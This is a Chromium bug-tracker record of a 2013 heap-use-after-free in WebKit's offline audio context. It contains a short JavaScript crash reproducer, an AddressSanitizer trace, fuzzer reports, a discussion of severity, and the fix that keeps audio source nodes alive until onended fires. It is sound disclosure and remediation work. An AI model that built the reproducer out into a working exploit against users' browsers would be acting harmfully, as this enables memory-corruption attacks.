# Heap-use-after-free in webkitOfflineAudioContext

| Field | Value |
|-------|-------|
| **Issue ID** | [40077896](https://issues.chromium.org/issues/40077896) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Media>Audio |
| **Reporter** | li...@gmail.com |
| **Assignee** | rt...@chromium.org |
| **Created** | 2013-08-07 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

heap-use-after-free in webkitOfflineAudioContext.  

The test case below also triggers null-dereference crashes, which seems to be depending on when the event function triggered.  

Also observed similar crashes using createBufferSource().

**VERSION**  

Chrome Version: asan chrome build #213035, 215570, 216226  

Operating System: Ubuntu 13.04

**REPRODUCTION CASE**

<head>
<script>
choose = Math.floor(Math.random()\\*2);
if (choose==0){
c1 = new webkitOfflineAudioContext(1, 44100 \\* 0.5, 44100);
o1 = c1.createOscillator();
o1.connect(c1.destination);
o1.onended = function () {
};
o1.start(0);
o1.stop(0.1);
c1.startRendering();
}
setTimeout(document.location.href=document.URL, 1000);
</script>
</head>
</body>
# **FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**

==28634==ERROR: AddressSanitizer: heap-use-after-free on address 0x613000037400 at pc 0x7f09ed282823 bp 0x7fff89e06ee0 sp 0x7fff89e06ed8  

READ of size 8 at 0x613000037400 thread T0 (chrome)  

#0 0x7f09ed282822 in ref /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/EventTarget.h:101  

#1 0x7f09ef2d60c6 in notifyEnded /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/modules/webaudio/AudioScheduledSourceNode.cpp:194  

#2 0x7f09eb6cdd52 in MakeItSo /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/bind\_internal.h:871  

#3 0x7f09eb731354 in RunTask /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_loop.cc:478  

#4 0x7f09eb731cbb in DeferOrRunPendingTask /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_loop.cc:490  

#5 0x7f09eb731f21 in DoWork /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_loop.cc:604  

#6 0x7f09eb73edee in Run /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_pump\_default.cc:32  

#7 0x7f09eb73098b in RunInternal /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_loop.cc:432  

#8 0x7f09eb77ef39 in Run /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/run\_loop.cc:45  

#9 0x7f09eb72f6ed in Run /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_loop.cc:303  

#10 0x7f09ea9c7b80 in RendererMain /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../content/renderer/renderer\_main.cc:242  

#11 0x7f09e99329e6 in RunZygote /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../content/app/content\_main\_runner.cc:391  

#12 0x7f09e9933348 in RunNamedProcessTypeMain /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../content/app/content\_main\_runner.cc:451  

#13 0x7f09e9934210 in Run /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../content/app/content\_main\_runner.cc:763  

#14 0x7f09e99320a2 in ContentMain /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../content/app/content\_main.cc:35  

#15 0x7f09e749f586 in ChromeMain /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../chrome/app/chrome\_main.cc:32  

#16 0x7f09e749f4ca in main /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../chrome/app/chrome\_exe\_main\_gtk.cc:43  

#17 0x7f09ddc9076c in **libc\_start\_main /build/buildd/eglibc-2.15/csu/libc-start.c:226  

#18 0x7f09e749f3ec in *start ??:0  

0x613000037400 is located 0 bytes inside of 328-byte region [0x613000037400,0x613000037548)  

freed by thread T0 (chrome) here:  

#0 0x7f09e748cd35 in operator delete *asan\_rtl*  

#1 0x7f09ef2b54ee in deleteMarkedNodes /b/build/slave/ASAN\_Release\_\_symbolized*/build/src/out/Release/../../third\_party/WebKit/Source/modules/webaudio/AudioContext.cpp:825  

#2 0x7f09ef2c5cb0 in deref /b/build/slave/ASAN\_Release\_\_symbolized*/build/src/out/Release/../../third\_party/WebKit/Source/modules/webaudio/AudioNode.cpp:466  

#3 0x7f09eafe6838 in PostGarbageCollectionProcessing /b/build/slave/ASAN\_Release\_\_symbolized*/build/src/out/Release/../../v8/src/global-handles.cc:263  

#4 0x7f09eafe61af in PostGarbageCollectionProcessing /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/global-handles.cc:918  

#5 0x7f09eb01e2ab in PerformGarbageCollection /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/heap.cc:1012  

#6 0x7f09eb01da0c in CollectGarbage /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/heap.cc:687  

#7 0x7f09eafaa32b in CollectGarbage /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/heap-inl.h:507  

#8 0x7f09eb01d58e in CollectAllGarbage /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/heap.cc:594  

#9 0x7f09eb036581 in IdleNotification /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/heap.cc:5948  

#10 0x7f09eb36f3a4 in IdleNotification /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/v8.cc:196  

#11 0x7f09eaeec523 in IdleNotification /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/api.cc:5472  

#12 0x7f09ee2b060c in pseudoIdleTimerFired /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/bindings/v8/V8GCForContextDispose.cpp:74  

#13 0x7f09ed43f4d1 in sharedTimerFiredInternal /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/core/platform/ThreadTimers.cpp:134  

#14 0x7f09ed43ef04 in sharedTimerFired /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/core/platform/ThreadTimers.cpp:108  

#15 0x7f09ed5e093a in MakeItSo /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/bind\_internal.h:871  

#16 0x7f09ed5e0713 in Run /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/bind\_internal.h:1169  

#17 0x7f09eb7d7482 in RunScheduledTask /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/timer/timer.cc:181  

#18 0x7f09eb7d7aba in MakeItSo /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/bind\_internal.h:871  

#19 0x7f09eb7d7963 in Run /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/bind\_internal.h:1169  

#20 0x7f09eb731354 in RunTask /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_loop.cc:478  

#21 0x7f09eb731cbb in DeferOrRunPendingTask /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_loop.cc:490  

#22 0x7f09eb731f21 in DoWork /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_loop.cc:604  

#23 0x7f09eb73edee in Run /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_pump\_default.cc:32  

#24 0x7f09eb73098b in RunInternal /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_loop.cc:432  

#25 0x7f09eb77ef39 in Run /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/run\_loop.cc:45  

#26 0x7f09eb72f6ed in Run /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_loop.cc:303  

#27 0x7f09ea9c7b80 in RendererMain /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../content/renderer/renderer\_main.cc:242  

#28 0x7f09e99329e6 in RunZygote /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../content/app/content\_main\_runner.cc:391  

#29 0x7f09e9933348 in RunNamedProcessTypeMain /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../content/app/content\_main\_runner.cc:451  

previously allocated by thread T0 (chrome) here:  

#0 0x7f09e748ca75 in operator new *asan\_rtl*  

#1 0x7f09ef2e5abe in create /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/modules/webaudio/OscillatorNode.cpp:52  

#2 0x7f09ef2b82af in createOscillator /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/modules/webaudio/AudioContext.cpp:548  

#3 0x7f09edca805f in createOscillatorMethod /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/gen/blink/bindings/V8AudioContext.cpp:547  

#4 0x7f09edca4c4c in createOscillatorMethodCallback /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/gen/blink/bindings/V8AudioContext.cpp:554  

#5 0x7f09eaf10237 in Call /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/arguments.cc:103  

#6 0x7f09eaf34b25 in HandleApiCallHelper<false> /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/builtins.cc:1272  

#7 0x7f09eaf28684 in Builtin\_HandleApiCall /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/builtins.cc:1288  

#8 0x7f09b40072ad  

#9 0x7f09b405f376  

#10 0x7f09b402ad03  

#11 0x7f09b4017e16  

#8 0x7f09eafa38f2 in Invoke /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/execution.cc:119  

#9 0x7f09eaedcb5f in Run /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../v8/src/api.cc:2040  

#10 0x7f09ee0d684a in runCompiledScript /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/bindings/v8/V8ScriptRunner.cpp:95  

#11 0x7f09ee087168 in compileAndRunScript /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/bindings/v8/ScriptController.cpp:233  

#12 0x7f09ee08a4f1 in executeScriptInMainWorld /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/bindings/v8/ScriptController.cpp:673  

#13 0x7f09edab462f in executeScript /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:345  

#14 0x7f09edab22a3 in prepareScript /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:258  

#15 0x7f09ef7eb340 in runScript /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:298  

#16 0x7f09ef7eb0dd in execute /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:171  

#17 0x7f09ef7d5506 in runScriptsForPausedTreeBuilder /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:256  

#18 0x7f09ef7d6e77 in processParsedChunkFromBackgroundParser /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:428  

#19 0x7f09ef7d5135 in pumpPendingSpeculations /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:466  

#20 0x7f09ef7d5a52 in didReceiveParsedChunkFromBackgroundParser /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:316  

#21 0x7f09ef83315a in operator() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:210  

#22 0x7f09ef833025 in operator() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:420  

#23 0x7f09ef138bcd in callFunctionObject /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../third\_party/WebKit/Source/wtf/MainThread.cpp:62  

#24 0x7f09eb6cdd52 in MakeItSo /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/bind\_internal.h:871  

#25 0x7f09eb731354 in RunTask /b/build/slave/ASAN\_Release\_\_symbolized\_/build/src/out/Release/../../base/message\_loop/message\_loop.cc:478  

Shadow bytes around the buggy address:  

0x0c267fffee30: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa  

0x0c267fffee40: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x0c267fffee50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c267fffee60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c267fffee70: 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa  

=>0x0c267fffee80:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c267fffee90: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c267fffeea0: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa  

0x0c267fffeeb0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x0c267fffeec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c267fffeed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00

## Timeline

### cl...@chromium.org (2013-08-07)

ClusterFuzz is now working on this testcase. See https://cluster-fuzz.appspot.com/testcase?key=5651729076977664

### wf...@chromium.org (2013-08-07)

Thanks for the report.  Trying to repro here for impact assessment.  crogers@ any chance of finding an owner for this?  Could be http://crrev.com/18110015 perhaps?

### cl...@chromium.org (2013-08-08)

ClusterFuzz has detected this issue as fixed in range 216268:216322.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5651729076977664

Uploader: wfh@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: UNKNOWN
Crash Address: 0x000000000000
Crash State:
  - crash stack -
  WebCore::V8AbstractEventListener::handleEvent
  WebCore::EventTarget::fireEventListeners
  WebCore::EventTarget::fireEventListeners
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=209592:209601
Fixed: https://cluster-fuzz.appspot.com/revisions?range=216268:216322

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv948DDa3xLftpG6bLPFz1mbWo0ntZL5EmXJeu0XTmfesj9d8sh-Zvo6RXYyY7rGKrVsWISqJp-dM71hrjwbiscH7DToaF5-Tf-omxdE6wEXdyKg3nQvg1RlnODd34iky-0u8-qDzjBmoly4oidJ_jdGzCy3HcQ

Unreliable crash found using linux_tsan_chrome_mp job type (history_size=6).

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### pa...@google.com (2013-08-13)

Like an activist judge, I am an activist security sheriff. :) CCing kbr since he reviewed what might have been the relevant CL. crogers, please feel free to delgate this to someone on your team, if it's not yours after all.

### in...@chromium.org (2013-08-15)

Chris is no longer in the team. Ray for the rescue and help with triage.

### cl...@chromium.org (2013-08-15)

ClusterFuzz is now working on this testcase. See https://cluster-fuzz.appspot.com/testcase?key=5363383226335232

### cl...@chromium.org (2013-08-15)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5363383226335232

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: UNKNOWN
Crash Address: 0x000000000000
Crash State:
  - crash stack -
  WebCore::V8AbstractEventListener::handleEvent
  WebCore::EventTarget::fireEventListeners
  WebCore::EventTarget::fireEventListeners
  

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv968Ip-DblzdqD-jjF6jRNR9lkP-twX9_X8i4Eh6atffHFcMk0yZBqXWiP6O7Aj6BVHtGOxqgVlfy9M6QIN7AkwBwGTxXekL13EocDyKeBa3Rx3o2qEQb5IKMuik8nuhsyHft9eQVlyDuUQCPlEHUM7NoOKtIg

Fully reproducible crash found using linux_tsan_chrome_mp job type (history_size=6).


### in...@chromium.org (2013-08-15)

lifeasageek@, we need a better repro that actually crashes on heap uaf and not just keep hitting the null ptr crash.

### rt...@chromium.org (2013-08-27)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-08-27)

[Empty comment from Monorail migration]

### li...@gmail.com (2013-08-29)

@inferno sorry for being late -; On my setting (Ubuntu 12.04, asan-linux-release-215570), it's hitting heap-use-after-free almost at 50% chances. Other 50% are null-dereference.



### in...@chromium.org (2013-09-03)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-03)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-03)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-03)

Fixing severity based on the fact, that all of these are race conditions (free, crash on different threads). No reliable reproducer.

### cl...@chromium.org (2013-09-09)

ClusterFuzz has detected this issue as fixed in range 221446:221565.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5363383226335232

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: UNKNOWN
Crash Address: 0x000000000000
Crash State:
  - crash stack -
  WebCore::V8AbstractEventListener::handleEvent
  WebCore::EventTarget::fireEventListeners
  WebCore::EventTarget::fireEventListeners
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=209592:209601
Fixed: https://cluster-fuzz.appspot.com/revisions?range=221446:221565

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv968Ip-DblzdqD-jjF6jRNR9lkP-twX9_X8i4Eh6atffHFcMk0yZBqXWiP6O7Aj6BVHtGOxqgVlfy9M6QIN7AkwBwGTxXekL13EocDyKeBa3Rx3o2qEQb5IKMuik8nuhsyHft9eQVlyDuUQCPlEHUM7NoOKtIg

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### in...@chromium.org (2013-09-11)

Can't reproduce anymore on trunk. lifeasageek@, can you still reproduce it ?

### rt...@chromium.org (2013-09-11)

I was able to reproduce this yesterday, but the repro took a little longer than it used to.  I will try again today with ToT.

### in...@chromium.org (2013-09-11)

[Empty comment from Monorail migration]

### rt...@chromium.org (2013-09-11)

Built ToT just now. Still crashes on my linux box.

### bu...@chromium.org (2013-09-11)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=157615

------------------------------------------------------------------------
r157615 | rtoy@google.com | 2013-09-11T22:46:38.800071Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/modules/webaudio/AudioScheduledSourceNode.cpp?r1=157615&r2=157614&pathrev=157615
   M http://src.chromium.org/viewvc/blink/trunk/Source/modules/webaudio/AudioScheduledSourceNode.h?r1=157615&r2=157614&pathrev=157615

Keep AudioScheduledSourceNode alive until onended is called.

Also, if the document has already gone away, we want to avoid firing
the event at all. This is similar to what ScriptProcessorNode does
with events.

BUG=269753

Review URL: https://chromiumcodereview.appspot.com/23596014
------------------------------------------------------------------------

### in...@chromium.org (2013-09-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-12)

Please merge your change to the m30 branch (1599) by early next week [using drover]. We have m30 beta coming next week and we want all the security changes in by that time. 

### in...@chromium.org (2013-09-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-12)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-09-13)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=157762

------------------------------------------------------------------------
r157762 | rtoy@google.com | 2013-09-13T17:14:33.550380Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/1599/Source/modules/webaudio/AudioScheduledSourceNode.h?r1=157762&r2=157761&pathrev=157762
   M http://src.chromium.org/viewvc/blink/branches/chromium/1599/Source/modules/webaudio/AudioScheduledSourceNode.cpp?r1=157762&r2=157761&pathrev=157762

Merge 157615 "Keep AudioScheduledSourceNode alive until onended ..."

> Keep AudioScheduledSourceNode alive until onended is called.
> 
> Also, if the document has already gone away, we want to avoid firing
> the event at all. This is similar to what ScriptProcessorNode does
> with events.
> 
> BUG=269753
> 
> Review URL: https://chromiumcodereview.appspot.com/23596014

TBR=rtoy@google.com

Review URL: https://codereview.chromium.org/23710047
------------------------------------------------------------------------

### in...@chromium.org (2013-09-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-25)

Did you saw our new criteria for possibly issuing higher rewards? See http://www.chromium.org/Home/chromium-security/vulnerability-rewards-program/reward-nomination-process
E.g. If you are able to provide a repro that faulted at an address of 0x41414141, it will qualify for the new higher rewards. Or, if you can show that you have control between free and crash points, etc.

### mb...@chromium.org (2013-09-26)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-09-28)

$500 reward! (We put rewards for racy bugs out at $500; we would consider higher rewards if reliable control over memory corruption could be demonstrated from the race).

### pa...@chromium.org (2013-10-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-06)

Bulk update: removing view restriction from closed bugs.

### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### gl...@chromium.org (2015-06-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### ss...@google.com (2016-03-21)

Renaming Blink>Audio to Blink>Media>Audio for better characterization

[Monorail components: -Blink>Audio Blink>Media>Audio]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-29)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-29)

This issue was migrated from crbug.com/chromium/269753?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/278850, crbug.com/chromium/290198]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40077896)*
